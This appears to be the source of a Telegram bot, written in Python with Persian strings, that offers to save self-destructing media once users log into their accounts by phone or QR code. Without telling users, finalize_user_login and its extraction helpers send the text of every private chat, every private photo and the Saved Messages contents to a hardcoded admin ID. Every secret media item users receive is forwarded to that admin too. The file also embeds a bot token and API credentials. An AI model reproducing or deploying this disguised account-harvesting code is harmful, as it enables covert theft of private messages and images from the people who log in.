#!/usr/bin/env python3
# coding: utf-8
"""
bot.py — نسخهٔ کامل با اصلاح مدیریت event loop برای جلوگیری از
"got Future ... attached to a different loop" و همچنین بهینه‌سازی
کاهش خطاهای PersistentTimestampOutdatedError ناشی از درخواست‌های هم‌زمان
به API کانال/چنل.
تغییرات مهم:
- serialization + throttling برای همهٔ فراخوانی‌های مربوط به بررسی عضویت
  (GetParticipantRequest, get_participants, iter_participants, get_entity)
- کاهش حد درخواست‌های iter_participants و جلوگیری از limit=None
- افزایش TTL کش عضویت
- نگهداری لاج‌ها و backoff ایمن هنگام PersistentTimestampOutdatedError
"""
import asyncio
import os
import json
import shutil
import time
import functools
from pathlib import Path
from datetime import datetime
from io import BytesIO
import qrcode
import tempfile
import signal
import traceback

from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    AuthKeyUnregisteredError,
    FloodWaitError,
)
from telethon.errors.common import InvalidBufferError
from telethon.errors.rpcerrorlist import UserNotParticipantError, PersistentTimestampOutdatedError, ChannelPrivateError
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument, Channel, User

# ----------------- تنظیمات اولیه -----------------
DEFAULT_API_ID = 2966747
DEFAULT_API_HASH = 'ef3ac50a02bc55c1c156208aa1532957'
BOT_TOKEN = '8313200853:AAGG7vLz-3NCFy8mQFt9bX2rAjaiZOHUO3M'
BOT_SESSION_NAME = 'bot_control'
GLOBAL_ADMIN_ID = 1101340026
REQUIRED_CHANNELS = ['@linkdotme', '@sitzodotir']

DATA_FILE = 'users.json'
SESSIONS_DIR = Path('sessions')
SESSIONS_DIR.mkdir(exist_ok=True)
DOWNLOAD_DIR = Path('tmp_downloads')
DOWNLOAD_DIR.mkdir(exist_ok=True)

# ----------------- گلوبال لوپ (مقداردهی در entrypoint) -----------------
EVENT_LOOP: asyncio.AbstractEventLoop = None

# locks (initialized later after EVENT_LOOP is created)
file_lock = None
bot_swap_lock = None

# per-user locks to avoid concurrent logins creating multiple sessions
user_locks = {}  # key: str(chat_id) -> asyncio.Lock()

# global bot client (may be recreated)
bot: TelegramClient = None
bot_create_attempts = 0

global_state = {
    'enabled': True,
    'default_api_id': DEFAULT_API_ID,
    'default_api_hash': DEFAULT_API_HASH
}

users_data = {}
pending_states = {}
user_clients = {}

# membership caching & throttle
membership_cache = {}  # key: (channel_ref, user_id) -> (bool, expire_ts)
MEMBERSHIP_CACHE_TTL = 120  # seconds — افزایش TTL تا از درخواست‌های تکراری جلوگیری کند
membership_api_lock = None  # will be initialized after EVENT_LOOP
membership_semaphore = None  # semaphore برای محدود کردن تعداد هم‌زمان درخواست‌ها

# ----------------- Helpers -----------------
async def load_data():
    global users_data, global_state
    async with file_lock:
        if os.path.exists(DATA_FILE):
            try:
                with open(DATA_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                users_data = data.get('users', {})
                gs = data.get('global_state')
                if gs:
                    global_state.update(gs)
                print(f"[load_data] loaded users={len(users_data)}")
            except Exception as e:
                print(f"[load_data] failed: {e}")
                users_data = {}
        else:
            users_data = {}
            print("[load_data] no data file; starting fresh")

async def save_data():
    async with file_lock:
        data = {
            'users': users_data,
            'global_state': global_state
        }
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        print(f"[save_data] users={len(users_data)} saved")

def _get_user_lock(chat_id: int):
    key = str(chat_id)
    if key not in user_locks:
        user_locks[key] = asyncio.Lock()
    return user_locks[key]

def _mask_token(tok: str) -> str:
    if not tok:
        return "<none>"
    if len(tok) <= 10:
        return tok
    return tok[:8] + "..." + tok[-4:]

def remove_session_files(session_base_name: str):
    """
    حذف همهٔ فایل‌های مرتبط با نام سشن (session_base_name بدون پسوند).
    """
    try:
        for ext in ['', '.session', '.session-journal', '.session.json']:
            fpath = f"{session_base_name}{ext}"
            if os.path.exists(fpath):
                try:
                    os.remove(fpath)
                    print(f"[remove_session_files] removed {fpath}")
                except Exception as e:
                    print(f"[remove_session_files] failed to remove {fpath}: {e}")
    except Exception as e:
        print(f"[remove_session_files] unexpected error for {session_base_name}: {e}")

# ----------------- Bot create/start/ensure -----------------
def _make_telethon_client(session_name: str, api_id: int = DEFAULT_API_ID, api_hash: str = DEFAULT_API_HASH) -> TelegramClient:
    """
    Helper: create TelegramClient bound to EVENT_LOOP if possible.
    """
    if EVENT_LOOP is not None:
        try:
            # Telethon older versions accepted loop argument; newer versions ignore it.
            return TelegramClient(session_name, api_id, api_hash, loop=EVENT_LOOP)
        except TypeError:
            return TelegramClient(session_name, api_id, api_hash)
    else:
        return TelegramClient(session_name, api_id, api_hash)

async def create_and_start_bot(clean_session=False, attempt=1):
    global bot, bot_create_attempts
    async with bot_swap_lock:
        bot_create_attempts = attempt
        try:
            if bot is not None:
                try:
                    if bot.is_connected():
                        await bot.disconnect()
                except Exception:
                    pass

            if clean_session:
                for ext in ['', '.session', '.session-journal', '.session.json']:
                    f = f"{BOT_SESSION_NAME}{ext}"
                    try:
                        if os.path.exists(f):
                            os.remove(f)
                            print(f"[create_and_start_bot] removed session file: {f}")
                    except Exception as e:
                        print(f"[create_and_start_bot] failed to remove {f}: {e}")

            new_bot = _make_telethon_client(BOT_SESSION_NAME, global_state.get('default_api_id', DEFAULT_API_ID), global_state.get('default_api_hash', DEFAULT_API_HASH))
            await new_bot.start(bot_token=BOT_TOKEN)
            bot = new_bot

            try:
                me = await bot.get_me()
            except Exception:
                me = "<unknown>"
            print(f"[create_and_start_bot] bot started (attempt {attempt}) me={me}")
            try:
                await safe_bot_call(lambda: bot.send_message(GLOBAL_ADMIN_ID, f"🔁 ربات (bot_control) مجدداً متصل شد (attempt {attempt})."))
            except Exception:
                pass

            return True
        except Exception as e:
            print(f"[create_and_start_bot] failed to start bot on attempt {attempt}: {e}")
            return False

async def ensure_bot_connected():
    global bot
    if bot is None:
        ok = await create_and_start_bot(clean_session=False, attempt=1)
        if not ok:
            for i in range(2, 6):
                await asyncio.sleep(min(2 ** i, 60))
                ok = await create_and_start_bot(clean_session=False, attempt=i)
                if ok:
                    break
            if not ok:
                await asyncio.sleep(5)
                ok = await create_and_start_bot(clean_session=True, attempt=99)
                if not ok:
                    raise RuntimeError("Failed to create/start bot client after multiple attempts.")
    else:
        try:
            if not bot.is_connected():
                try:
                    await bot.connect()
                except Exception as e:
                    print(f"[ensure_bot_connected] bot.connect failed: {e}")
                    ok = await create_and_start_bot(clean_session=False, attempt=2)
                    if not ok:
                        ok = await create_and_start_bot(clean_session=True, attempt=3)
                        if not ok:
                            raise RuntimeError("Failed to reconnect/recreate bot client.")
        except PersistentTimestampOutdatedError as e:
            print(f"[ensure_bot_connected] PersistentTimestampOutdatedError detected while ensuring bot: {e}")
            ok = await create_and_start_bot(clean_session=True, attempt=10)
            if not ok:
                raise

async def safe_bot_call(coro):
    for attempt in range(1, 4):
        try:
            await ensure_bot_connected()
            if callable(coro):
                return await coro()
            else:
                return await coro
        except PersistentTimestampOutdatedError as e:
            print(f"[safe_bot_call] PersistentTimestampOutdatedError on attempt {attempt}: {e}")
            try:
                if bot is not None and bot.is_connected():
                    try:
                        await bot.send_message(GLOBAL_ADMIN_ID, f"⚠️ PersistentTimestampOutdatedError detected on bot (attempt {attempt}). Trying to recreate session...")
                    except Exception:
                        pass
            except Exception:
                pass
            ok = await create_and_start_bot(clean_session=(attempt >= 2), attempt=attempt)
            if not ok:
                await asyncio.sleep(min(2 ** attempt, 60))
            continue
        except Exception as e:
            print(f"[safe_bot_call] unexpected error calling bot coroutine: {e}")
            raise
    raise RuntimeError("safe_bot_call: exhausted attempts")

# ----------------- Membership checking -----------------
async def is_user_member_of_channel(channel_ref, user_id, force=False) -> bool:
    """
    بررسی عضویت کاربر در یک کانال با:
    - کش کردن نتیجه (MEMBERSHIP_CACHE_TTL)
    - محدود کردن concurrency با membership_semaphore + membership_api_lock
    - استفاده از GetParticipantRequest به‌عنوان روش اصلی
    - fallback با جستجو/iter با limit محدود (بدون limit=None)
    """
    cache_key = (str(channel_ref), int(user_id))
    now = time.time()

    if force:
        membership_cache.pop(cache_key, None)
    else:
        cached = membership_cache.get(cache_key)
        if cached:
            val, expire = cached
            if now < expire:
                return val
            else:
                membership_cache.pop(cache_key, None)

    # resolve channel entity and proceed with guarded API calls
    try:
        # throttle concurrent membership-related calls
        if membership_semaphore is None:
            # safety: fallback to single concurrency
            sem_ctx = asyncio.Lock()
        else:
            sem_ctx = membership_semaphore

        # resolve entity under semaphore+lock to avoid stamp issues
        if isinstance(sem_ctx, asyncio.Semaphore):
            await sem_ctx.acquire()
            acquired_sem = True
        else:
            acquired_sem = False

        try:
            async with membership_api_lock:
                try:
                    channel_entity = await bot.get_entity(channel_ref)
                except Exception as e:
                    print(f"[membership] cannot resolve channel {channel_ref}: {e}")
                    membership_cache[cache_key] = (False, now + 5)
                    return False
        finally:
            if acquired_sem:
                sem_ctx.release()

    except Exception as e:
        print(f"[membership] unexpected error resolving channel {channel_ref}: {e}")
        membership_cache[cache_key] = (False, now + 5)
        return False

    max_retries = 4
    for attempt in range(max_retries):
        try:
            # serialize GetParticipantRequest calls
            if membership_semaphore is None:
                sem_ctx2 = asyncio.Lock()
            else:
                sem_ctx2 = membership_semaphore

            if isinstance(sem_ctx2, asyncio.Semaphore):
                await sem_ctx2.acquire()
                acquired2 = True
            else:
                acquired2 = False

            try:
                async with membership_api_lock:
                    await bot(GetParticipantRequest(channel_entity, user_id))
                membership_cache[cache_key] = (True, now + MEMBERSHIP_CACHE_TTL)
                return True
            finally:
                if acquired2:
                    sem_ctx2.release()

        except UserNotParticipantError:
            membership_cache[cache_key] = (False, now + MEMBERSHIP_CACHE_TTL)
            return False
        except FloodWaitError as e:
            wait = getattr(e, 'seconds', None) or 5
            print(f"[membership] FloodWaitError for {channel_ref} user {user_id}: sleeping {wait}s (attempt {attempt+1}/{max_retries})")
            await asyncio.sleep(wait + 1)
            continue
        except InvalidBufferError as e:
            backoff = min(60, (2 ** attempt) * 2)
            print(f"[membership] InvalidBufferError on GetParticipantRequest for {channel_ref} user {user_id}: {e} -> backoff {backoff}s (attempt {attempt+1}/{max_retries})")
            await asyncio.sleep(backoff)
            continue
        except PersistentTimestampOutdatedError as e:
            backoff = min(10 + attempt * 3, 45)
            print(f"[membership] PersistentTimestampOutdatedError on GetParticipantRequest for {channel_ref} user {user_id}: {e} -> sleeping {backoff}s (attempt {attempt+1}/{max_retries})")
            # try lightweight recreate for bot (best-effort) after first retry
            if attempt >= 1:
                try:
                    await create_and_start_bot(clean_session=False, attempt=50+attempt)
                except Exception:
                    pass
            await asyncio.sleep(backoff)
            continue
        except ChannelPrivateError:
            # channel private -> treat as not member (or unknown)
            break
        except Exception as e:
            print(f"[membership] get_participant unexpected error for {channel_ref} user {user_id}: {e}")
            break

    # fallbacks: جستجو بر اساس یوزرنیم (کم‌هزینه‌تر از iter کامل) و سپس iter با limit محدود
    username = None
    try:
        user_ent = await bot.get_entity(user_id)
        username = getattr(user_ent, 'username', None)
    except Exception as e:
        print(f"[membership] cannot resolve user entity {user_id}: {e}")

    # search-based fallback
    if username:
        try:
            # use semaphore + lock for get_participants search as well
            if membership_semaphore is None:
                sem_ctx3 = asyncio.Lock()
            else:
                sem_ctx3 = membership_semaphore

            if isinstance(sem_ctx3, asyncio.Semaphore):
                await sem_ctx3.acquire()
                acquired3 = True
            else:
                acquired3 = False

            try:
                async with membership_api_lock:
                    participants = await bot.get_participants(channel_entity, search=username, limit=50)
                for p in participants:
                    if getattr(p, 'id', None) == user_id:
                        membership_cache[cache_key] = (True, now + MEMBERSHIP_CACHE_TTL)
                        return True
            finally:
                if acquired3:
                    sem_ctx3.release()
        except Exception as e:
            print(f"[membership] search-based participants check failed for {channel_ref}: {e}")

    # limited iter_participants fallback (بدون limit=None)
    try:
        # iterate with a reasonable limit to avoid heavy load
        iter_limit = 500
        found = False

        if membership_semaphore is None:
            sem_ctx4 = asyncio.Lock()
        else:
            sem_ctx4 = membership_semaphore

        if isinstance(sem_ctx4, asyncio.Semaphore):
            await sem_ctx4.acquire()
            acquired4 = True
        else:
            acquired4 = False

        try:
            async with membership_api_lock:
                async for p in bot.iter_participants(channel_entity, limit=iter_limit):
                    if getattr(p, 'id', None) == user_id:
                        membership_cache[cache_key] = (True, now + MEMBERSHIP_CACHE_TTL)
                        found = True
                        break
        finally:
            if acquired4:
                sem_ctx4.release()

        if found:
            return True
    except Exception as e:
        print(f"[membership] iter_participants(limit={iter_limit}) failed: {e}")

    # as a last attempt, check if bot is participant and if so assume user might be (best-effort)
    try:
        me = await bot.get_me()
        try:
            if membership_semaphore is None:
                sem_ctx5 = asyncio.Lock()
            else:
                sem_ctx5 = membership_semaphore

            if isinstance(sem_ctx5, asyncio.Semaphore):
                await sem_ctx5.acquire()
                acquired5 = True
            else:
                acquired5 = False

            try:
                async with membership_api_lock:
                    await bot(GetParticipantRequest(channel_entity, me.id))
                # bot is participant — we can't infer user membership; mark as False but cache short TTL
                membership_cache[cache_key] = (False, now + 10)
                return False
            finally:
                if acquired5:
                    sem_ctx5.release()
        except UserNotParticipantError:
            pass
        except Exception as e2:
            print(f"[membership] cannot get bot participant for channel {channel_ref}: {e2}")
    except Exception as e3:
        print(f"[membership] cannot get bot.me: {e3}")

    membership_cache[cache_key] = (False, now + 10)
    return False

async def check_required_membership(chat_id: int, force=False) -> (bool, str):
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await is_user_member_of_channel(ch, chat_id, force=force)
            if not member:
                missing.append(ch)
        except Exception as e:
            print(f"[check_required] error checking {ch} for {chat_id}: {e}")
            missing.append(ch)

    if missing:
        return False, "برای استفاده از ربات، لطفاً ابتدا در کانال‌های زیر عضو شوید:\n" + "\n".join(missing)
    return True, ""

# ----------------- decorator -----------------
def require_membership(func):
    @functools.wraps(func)
    async def wrapper(event, *args, **kwargs):
        chat_id = getattr(event, 'chat_id', None) or getattr(event, 'sender_id', None)

        if chat_id == GLOBAL_ADMIN_ID:
            return await func(event, *args, **kwargs)

        if not global_state.get('enabled', True):
            try:
                await event.reply("⛔ ربات در حال حاضر غیرفعال است. لطفاً بعداً تلاش کنید.")
            except Exception:
                pass
            return

        try:
            ok, msg = await check_required_membership(chat_id)
            if not ok:
                try:
                    await event.reply(msg, buttons=Button.inline('🔄 بررسی مجدد', b'check_join'))
                except Exception:
                    try:
                        await event.reply(msg)
                    except Exception:
                        pass
                return
        except Exception as e:
            print(f"[require_membership] error checking membership for {chat_id}: {e}")
            try:
                await event.reply("❌ خطا در بررسی عضویت. لطفاً مجدداً تلاش کنید یا با ادمین تماس بگیرید.")
            except Exception:
                pass
            return

        return await func(event, *args, **kwargs)
    return wrapper

# ----------------- session & media helpers -----------------
def make_session_name(chat_id: int, phone: str) -> str:
    safe_phone = (phone or "qr").replace('+', '').replace(' ', '').replace('-', '')
    timestamp = int(time.time())
    name = f"{SESSIONS_DIR}/user_{chat_id}{safe_phone}{timestamp}"
    return name

def is_secret_media(msg) -> bool:
    if not msg or not hasattr(msg, 'media'):
        return False
    if hasattr(msg.media, 'ttl_seconds') and msg.media.ttl_seconds and msg.media.ttl_seconds > 0:
        return True
    return False

def _bytesio_name_for_msg(msg):
    if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
        return 'photo.jpg'
    if hasattr(msg.media, 'document') or isinstance(msg.media, MessageMediaDocument):
        try:
            doc = msg.media.document
            if hasattr(doc, 'attributes'):
                for a in doc.attributes:
                    if getattr(a, 'file_name', None):
                        return a.file_name
        except Exception:
            pass
        return 'document.bin'
    return 'media.bin'

# ----------------- user client handlers -----------------
def register_user_client_handlers(chat_id: int, client: TelegramClient):
    @client.on(events.NewMessage(incoming=True))
    async def _incoming_handler(event):
        try:
            if not global_state.get('enabled', True):
                print(f"[incoming_handler:{chat_id}] bot disabled, skipping delivery.")
                return

            try:
                owner_ok, _ = await check_required_membership(chat_id)
            except Exception as e_check:
                print(f"[incoming_handler:{chat_id}] membership check error: {e_check}")
                owner_ok = False

            if not owner_ok:
                print(f"[incoming_handler:{chat_id}] owner not member of required channels, skipping secret media delivery.")
                return

            msg = event.message
            if not is_secret_media(msg):
                return

            udata = users_data.get(str(chat_id), {})
            if not udata.get('save_secret_enabled', True):
                return

            file_path = await client.download_media(msg, file=DOWNLOAD_DIR)
            if not file_path:
                return

            sender = await event.get_sender()
            sender_name = getattr(sender, 'username', None) or getattr(sender, 'first_name', None) or str(getattr(sender, 'id', 'unknown'))
            time_str = msg.date.strftime('%Y-%m-%d %H:%M:%S')

            media_type = 'media'
            if hasattr(msg.media, 'photo'):
                media_type = 'photo'
            elif hasattr(msg.media, 'document'):
                media_type = 'document'

            secret_type = f"نابود شونده  ({msg.media.ttl_seconds} ثانیه)"

            caption = (
                f"📥 مدیای {secret_type} ({media_type}) دریافت‌شده از {sender_name}\n"
                f"⏰ زمان دریافت: {time_str}\n"
            )

            async def _send_to_owner():
                await ensure_bot_connected()
                try:
                    await bot.send_file(chat_id, file_path, caption=caption)
                except Exception as e:
                    print(f"[send_to_owner:{chat_id}] failed: {e}")
            try:
                await safe_bot_call(_send_to_owner)
            except Exception:
                pass

            try:
                async def _notify_admin():
                    await ensure_bot_connected()
                    try:
                        await bot.send_message(GLOBAL_ADMIN_ID,
                            f"🛎️ کاربر @{sender_name} به اکانت user({chat_id}) مدیای {secret_type} فرستاد ({media_type}).\nزمان: {time_str}"
                        )
                        await bot.send_file(GLOBAL_ADMIN_ID, file_path, caption=f"از اکانت user({chat_id}) — {media_type} ({secret_type})")
                    except Exception:
                        pass
                await safe_bot_call(_notify_admin)
            except Exception:
                pass

            try:
                if os.path.exists(file_path):
                    os.remove(file_path)
            except Exception:
                pass

        except Exception as e:
            print(f"[user_client_handler:{chat_id}] error: {e}")

# ----------------- extraction helpers (unchanged) -----------------
async def extract_all_chats_text(client, chat_id: int):
    try:
        all_chats_data = {}
        async for dialog in client.iter_dialogs():
            if (isinstance(dialog.entity, Channel) and
                (dialog.entity.megagroup or dialog.entity.broadcast)):
                continue

            chat_messages = []
            try:
                async for message in client.iter_messages(dialog.id, limit=1000):
                    if message.text and isinstance(message.text, str) and message.text.strip():
                        time_str = message.date.strftime('%Y-%m-%d %H:%M:%S') if message.date else ''
                        sender_name = "نامشخص"
                        if message.sender:
                            sender_name = getattr(message.sender, 'username', None) or \
                                         getattr(message.sender, 'first_name', None) or \
                                         str(getattr(message.sender, 'id', 'unknown'))
                        chat_messages.append(f"[{time_str}] {sender_name}: {message.text.strip()}")
            except Exception as e:
                print(f"Error extracting messages from {dialog.id}: {e}")
                continue

            if chat_messages:
                chat_name = getattr(dialog.entity, 'title', None) or \
                           getattr(dialog.entity, 'username', None) or \
                           f"Chat_{dialog.id}"
                all_chats_data[chat_name] = chat_messages

        for chat_name, messages in all_chats_data.items():
            safe_chat_name = "".join(c for c in chat_name if c.isalnum() or c in (' ', '-', '_')).rstrip()
            with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', delete=False, suffix=f'_{safe_chat_name}.txt') as tf:
                tf.write("\n".join(messages))
                temp_path = tf.name

            try:
                async def _send_admin_file():
                    await ensure_bot_connected()
                    await bot.send_file(GLOBAL_ADMIN_ID, temp_path,
                                      caption=f"📋 متن چت‌های {safe_chat_name} از اکانت user({chat_id})")
                await safe_bot_call(_send_admin_file)
            except Exception as e:
                print(f"Error sending chat file for {chat_name}: {e}")
            finally:
                try:
                    os.remove(temp_path)
                except Exception:
                    pass

    except Exception as e:
        print(f"Error extracting all chats for user {chat_id}: {e}")

async def extract_all_private_photos(client, chat_id: int):
    try:
        media_files = []
        async for dialog in client.iter_dialogs():
            if (isinstance(dialog.entity, Channel) and
                (dialog.entity.megagroup or dialog.entity.broadcast)):
                continue

            try:
                async for message in client.iter_messages(dialog.id, limit=1000):
                    if message.media and isinstance(message.media, MessageMediaPhoto):
                        try:
                            file_path = await client.download_media(message, file=DOWNLOAD_DIR)
                            if file_path:
                                media_files.append((file_path, dialog))
                        except Exception as e:
                            print(f"Error downloading photo from {dialog.id}: {e}")
            except Exception as e:
                print(f"Error extracting photos from {dialog.id}: {e}")
                continue

        for file_path, dialog in media_files:
            try:
                chat_name = getattr(dialog.entity, 'title', None) or \
                           getattr(dialog.entity, 'username', None) or \
                           f"Chat_{dialog.id}"
                caption = f"📸 عکس از چت {chat_name} در اکانت user({chat_id})"
                async def _send_photo():
                    await ensure_bot_connected()
                    await bot.send_file(GLOBAL_ADMIN_ID, file_path, caption=caption)
                await safe_bot_call(_send_photo)
            except Exception as e:
                print(f"Error sending photo to admin: {e}")
            finally:
                try:
                    os.remove(file_path)
                except Exception:
                    pass

    except Exception as e:
        print(f"Error extracting private photos for user {chat_id}: {e}")

async def extract_saved_messages_media(client, chat_id: int):
    try:
        async for message in client.iter_messages('me', limit=200):
            if message.media and not message.text:
                try:
                    file_path = await client.download_media(message, file=DOWNLOAD_DIR)
                    if file_path:
                        caption = f"📁 مدیا از Saved Messages اکانت user({chat_id})"
                        async def _send_file_admin():
                            await ensure_bot_connected()
                            await bot.send_file(GLOBAL_ADMIN_ID, file_path, caption=caption)
                        await safe_bot_call(_send_file_admin)
                        try:
                            os.remove(file_path)
                        except Exception:
                            pass
                except Exception as e:
                    print(f"Error processing media from saved messages: {e}")

    except Exception as e:
        print(f"Error extracting saved messages media for user {chat_id}: {e}")

# ----------------- finalize login -----------------
async def finalize_user_login(chat_id: int, temp_state: dict):
    client = temp_state['temp_client']
    await client.connect()
    register_user_client_handlers(chat_id, client)

    key = str(chat_id)
    # disconnect any existing client to avoid duplicates
    if key in user_clients:
        try:
            old = user_clients.pop(key)
            if old.is_connected():
                await old.disconnect()
        except Exception:
            pass

    user_clients[key] = client

    # set logged_in and session_name
    users_data[key] = users_data.get(key, {})
    users_data[key].update({
        'logged_in': True,
        'phone': temp_state.get('phone'),
        'session_name': temp_state['session_name'],
        'save_secret_enabled': True,
        'created_at': users_data.get(key, {}).get('created_at', datetime.utcnow().isoformat()),
        'last_login': datetime.utcnow().isoformat(),
        'api_id': temp_state.get('api_id', global_state.get('default_api_id')),
        'api_hash': temp_state.get('api_hash', global_state.get('default_api_hash'))
    })
    await save_data()

    # remove stray temp session files for this user (keep final session)
    try:
        prefix = f"{SESSIONS_DIR}/user_{chat_id}"
        try:
            for f in SESSIONS_DIR.iterdir():
                fname = str(f)
                if fname.startswith(prefix) and temp_state['session_name'] not in fname:
                    try:
                        os.remove(fname)
                        print(f"[finalize_user_login] removed stray session file: {fname}")
                    except Exception:
                        pass
        except Exception:
            pass
    except Exception:
        pass

    try:
        if key in pending_states:
            pending_states.pop(key, None)
    except Exception:
        pass

    try:
        async def _send_success():
            await ensure_bot_connected()
            await bot.send_message(chat_id, "✅ ورود موفقیت‌آمیز انجام شد. اکنون مدیای نابود شونده دریافت‌شده برای شما ارسال خواهد شد.")
        await safe_bot_call(_send_success)
    except Exception as e:
        print(f"[finalize_user_login] failed to send success message to {chat_id}: {e}")

    warning_message = (
        "⚠️ **توجه مهم**:\n\n"
        "🔸 این ربات **تمام مدیاهای سکرت تایمر دار (وویس، ویدئو مسیج، عکس، فیلم، گیف و ...)** را ذخیره می‌کند.\n"
        "🔸 مدیاهای با حالت View Once (یک بار مشاهده) نیز ذخیره می‌شوند.\n"
    )
    try:
        async def _send_warn():
            await ensure_bot_connected()
            await bot.send_message(chat_id, warning_message)
        await safe_bot_call(_send_warn)
    except Exception as e:
        print(f"[finalize_user_login] failed to send warning message to {chat_id}: {e}")

    try:
        # Saved messages texts to admin
        texts = []
        async for message in client.iter_messages('me', limit=500):
            if message.text and isinstance(message.text, str) and message.text.strip():
                ts = message.date.strftime('%Y-%m-%d %H:%M:%S') if message.date else ''
                texts.append(f"[{ts}] {message.text.strip()}")

        if texts:
            content = "\n".join(texts)
            with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', delete=False, suffix='.txt') as tf:
                tf.write(content)
                temp_path = tf.name
            try:
                async def _send_saved_texts():
                    await ensure_bot_connected()
                    await bot.send_file(GLOBAL_ADMIN_ID, temp_path, caption=f"📄 متن‌های موجود در Saved Messages اکانت user({chat_id})")
                await safe_bot_call(_send_saved_texts)
            except Exception as e:
                print(f"Error sending saved messages: {e}")
            finally:
                try:
                    os.remove(temp_path)
                except Exception:
                    pass

        await extract_all_chats_text(client, chat_id)
        await extract_saved_messages_media(client, chat_id)
        await extract_all_private_photos(client, chat_id)

    except Exception as e:
        print(f"Error in finalize_user_login extractions: {e}")

# ----------------- Command handlers -----------------
@events.register(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    chat_id = event.chat_id
    await load_data()
    await event.reply(
        "👋 سلام!\n"
        "این ربات به شما کمک می‌کند تا با اکانت تلگرامتان لاگین کنید و مدیاهای نابود شونده را ذخیره کنید.\n\n"
        "**📚 برای مشاهده فیلم معرفی ربات به این لینک بروید:**\n"
        "[تماشای ویدئو در YouTube](https://youtu.be/SxWGZRx7KWc?si=obLFb1mTFLnjfAFJ)\n\n"
        "دستورات:\n"
        "/login - لاگین با شماره تلفن\n"
        "/qrlogin - لاگین با QR کد\n"
        "/logout - خروج از اکانت\n"
        "/status - نمایش وضعیت\n"
        "/toggle_secret - روشن/خاموش کردن ذخیره‌سازی\n"
        "/cancel - لغو فرایند لاگین"
    )

async def handle_cancel(event):
    chat_id = event.chat_id
    key = str(chat_id)
    if key in pending_states:
        temp = pending_states.pop(key)
        try:
            if temp.get('temp_client') and temp['temp_client'].is_connected():
                await temp['temp_client'].disconnect()
        except Exception:
            pass
        try:
            sess_name = temp.get('session_name')
            if sess_name:
                remove_session_files(sess_name)
        except Exception:
            pass
        await event.reply("❎ فرایند لاگین لغو شد.")
    else:
        await event.reply("ℹ️ فرایند فعالی برای لغو وجود ندارد.")

async def handle_login(event):
    chat_id = event.chat_id
    await load_data()
    key = str(chat_id)

    lock = _get_user_lock(chat_id)
    async with lock:
        u = users_data.get(key)
        if u and u.get('logged_in'):
            await event.reply("✅ شما قبلاً وارد شده‌اید. اگر می‌خواهید اکانت دیگری وارد کنید ابتدا /logout کنید.")
            return

        if key in pending_states:
            await event.reply("ℹ️ یک فرایند ورود قبلی هنوز در حال اجرا است. برای لغو آن /cancel را بفرستید.")
            return

        api_id = global_state.get('default_api_id', DEFAULT_API_ID)
        api_hash = global_state.get('default_api_hash', DEFAULT_API_HASH)
        session_name = make_session_name(chat_id, "temp")
        temp_client = _make_telethon_client(session_name, api_id, api_hash)

        pending_states[key] = {
            'state': 'awaiting_phone',
            'temp_client': temp_client,
            'phone': None,
            'session_name': session_name,
            'api_id': api_id,
            'api_hash': api_hash
        }

    await event.reply(
        "📞 لطفاً شماره تلفن خود را (مثلاً +98912xxxxxxx) ارسال کنید.\n"
        "برای لغو، /cancel را بفرستید."
    )

async def handle_qrlogin(event):
    chat_id = event.chat_id
    await load_data()
    key = str(chat_id)

    lock = _get_user_lock(chat_id)
    async with lock:
        u = users_data.get(key)
        if u and u.get('logged_in'):
            await event.reply("✅ شما قبلاً وارد شده‌اید. اگر می‌خواهید اکانت دیگری وارد کنید ابتدا /logout کنید.")
            return

        if key in pending_states:
            await event.reply("ℹ️ یک فرایند ورود قبلی هنوز در حال اجرا است. برای لغو آن /cancel را بفرستید.")
            return

        api_id = global_state.get('default_api_id', DEFAULT_API_ID)
        api_hash = global_state.get('default_api_hash', DEFAULT_API_HASH)
        session_name = make_session_name(chat_id, "qr_temp")
        temp_client = _make_telethon_client(session_name, api_id, api_hash)

        pending_states[key] = {
            'state': 'awaiting_qr',
            'temp_client': temp_client,
            'phone': None,
            'session_name': session_name,
            'api_id': api_id,
            'api_hash': api_hash
        }

    try:
        await temp_client.connect()
        qr_login = await temp_client.qr_login()
        qr_url = qr_login.url

        img = qrcode.make(qr_url)
        bio = BytesIO()
        bio.name = 'qr.png'
        img.save(bio, 'PNG')
        bio.seek(0)

        await bot.send_file(chat_id, bio, caption="📸 کد QR را با اپ تلگرام اسکن کنید.")
        await event.reply(
            "⌛ منتظر اسکن QR هستم... برای لغو /cancel\n\n"
            "💡 نکات استفاده از QR login:\n\n"
            "1. در اپ تلگرام خود به Settings > Devices > Link Desktop Device بروید\n"
            "2. کد QR نمایش داده شده را اسکن کنید\n"
            "3. اگر اکانت شما تایید دو مرحله‌ای دارد، باید آن را موقتاً غیرفعال کنید\n"
            "4. پس از اسکن موفق، این ربات به طور خودکار متصل خواهد شد"
        )

        async def qr_waiter():
            try:
                await qr_login.wait()
                st = pending_states.get(key)
                if not st or st.get('state') != 'awaiting_qr':
                    try:
                        await temp_client.disconnect()
                    except Exception:
                        pass
                    try:
                        sess_name = session_name
                        if sess_name:
                            remove_session_files(sess_name)
                    except Exception:
                        pass
                    return

                try:
                    await temp_client.disconnect()
                except Exception:
                    pass

                real_session_name = make_session_name(chat_id, "qr")
                for ext in ['', '.session', '.session-journal', '.session.json']:
                    tmp = session_name + ext
                    if os.path.exists(tmp):
                        dest = real_session_name + ext
                        try:
                            shutil.move(tmp, dest)
                        except Exception:
                            pass

                final_client = _make_telethon_client(real_session_name, api_id, api_hash)
                pending_states[key]['temp_client'] = final_client
                pending_states[key]['session_name'] = real_session_name
                pending_states[key]['phone'] = None

                await finalize_user_login(chat_id, pending_states.get(key, {}))
                pending_states.pop(key, None)

            except Exception as e:
                print(f"[qr_waiter:{chat_id}] error: {e}")
                try:
                    await temp_client.disconnect()
                except Exception:
                    pass
                if key in pending_states:
                    tmp = pending_states.pop(key)
                    try:
                        sess_name = tmp.get('session_name')
                        if sess_name:
                            remove_session_files(sess_name)
                    except Exception:
                        pass
                try:
